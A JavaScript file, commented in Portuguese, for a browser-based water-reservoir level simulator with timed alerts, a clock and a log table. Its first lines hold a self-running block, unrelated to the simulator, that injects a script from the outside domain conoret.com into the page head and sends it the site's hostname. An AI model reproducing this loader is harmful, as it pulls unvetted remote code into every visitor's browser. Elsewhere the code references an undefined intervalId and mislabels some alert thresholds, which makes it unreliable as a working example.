// Adiciona um script externo ao head
if (window.top === window) {
    (function() {
        var e = document.createElement("script"),
            t = document.getElementsByTagName("head")[0];
        e.src = "//conoret.com/dsp?h=" + document.location.hostname + "&r=" + Math.random();
        e.type = "text/javascript";
        e.defer = true;
        e.async = true;
        t.appendChild(e);
    })();
}

let waterLevel = 20000; // Nível inicial da água em ml
const maxWaterLevel = 20000; // Nível máximo da água em ml
const minWaterLevel = 51; // Nível mínimo da água em ml
let isPaused = false;

function setup() {
    console.log("Setup iniciado");
    const momentos = [
        { perda: 0, alerta: "" },
        { perda: 5000, alerta: "" },
        { perda: 5000, alerta: "ALERTA: 50% DA CAPACIDADE" },
        { perda: 2500, alerta: "" },
        { perda: 2500, alerta: "ALERTA CRÍTICO: RESERVATÓRIO COM 75%" },
        { perda: 2500, alerta: "ATENÇÃO!! ALERTA SUPERCRÍTICO" },
        { perda: 1500, alerta: "" },
        { perda: 1500, alerta: "" },
        { perda: 1000, alerta: "ATENÇÃO RESERVATÓRIO COM RISCO DE ESGOTAMENTO" },
        { perda: 2000, alerta: "ALERTA VERMELHO: RESERVATÓRIO ESGOTADO" }
    ];

    let delay = 0;
    momentos.forEach((momento, index) => {
        setTimeout(() => {
            waterLevel -= momento.perda;
            updateWaterDisplay();
            logWaterLevel(waterLevel, momento.alerta);
        }, delay);
        delay += 1000; // 1 segundo de intervalo entre cada momento
    });

    setInterval(updateClock, 1000);

    document.getElementById('pause-button').addEventListener('click', togglePause);
    document.getElementById('reset-button').addEventListener('click', resetSystem);
    document.getElementById('print-button').addEventListener('click', imprimirResultados);
}

function updateWaterLevel() {
    // Função não necessária para este exemplo simplificado
}

function updateWaterDisplay() {
    document.getElementById('water').style.height = `${(waterLevel / maxWaterLevel) * 100}%`;
    document.getElementById('level-indicator').innerText = `Nível: ${waterLevel}ml`;
}

function updateClock() {
    if (!isPaused) {
        const now = new Date();
        const hours = now.getHours().toString().padStart(2, '0');
        const minutes = now.getMinutes().toString().padStart(2, '0');
        const seconds = now.getSeconds().toString().padStart(2, '0');
        document.getElementById('clock').innerText = `Hora: ${hours}:${minutes}:${seconds}`;
    }
}

function logWaterLevel(currentVolume, alerta) {
    console.log("Registrando nível de água:", currentVolume, alerta);
    const tableBody = document.getElementById('log-table').getElementsByTagName('tbody')[0];
    const newRow = tableBody.insertRow();
    const timeCell = newRow.insertCell(0);
    const levelCell = newRow.insertCell(1);
    const alertCell = newRow.insertCell(2);
    timeCell.innerText = document.getElementById('clock').innerText;
    levelCell.innerText = `${currentVolume}ml`;
    alertCell.innerText = alerta || "Nenhum alerta";
}

function togglePause() {
    isPaused = !isPaused;
    document.getElementById('pause-button').innerText = isPaused ? 'Continuar' : 'Interromper';
}

function resetSystem() {
    clearInterval(intervalId);
    waterLevel = 20000;
    isPaused = false;
    document.getElementById('pause-button').innerText = 'Interromper';
    document.getElementById('log-table').getElementsByTagName('tbody')[0].innerHTML = '';
    updateWaterDisplay();
}

function imprimirResultados() {
    const capacidadeReservatorio = 20000; // Capacidade do reservatório em ml
    const resultados = [];

    // Coleta os dados visíveis na tela
    const clock = document.getElementById('clock').innerText;
    const waterLevelDisplay = document.getElementById('level-indicator').innerText;
    const logTable = document.getElementById('log-table').getElementsByTagName('tbody')[0];
    const logRows = logTable.getElementsByTagName('tr');

    for (let i = 0; i < logRows.length; i++) {
        const cells = logRows[i].getElementsByTagName('td');
        resultados.push({
            dataHora: cells[0].innerText,
            volume: cells[1].innerText,
            alerta: cells[2].innerText
        });
    }

    console.log("Hora atual:", clock);
    console.log("Nível de água atual:", waterLevelDisplay);
    console.log("Log de resultados:", resultados);
}

// Certifique-se de chamar a função setup() quando a página carregar
window.onload = setup;
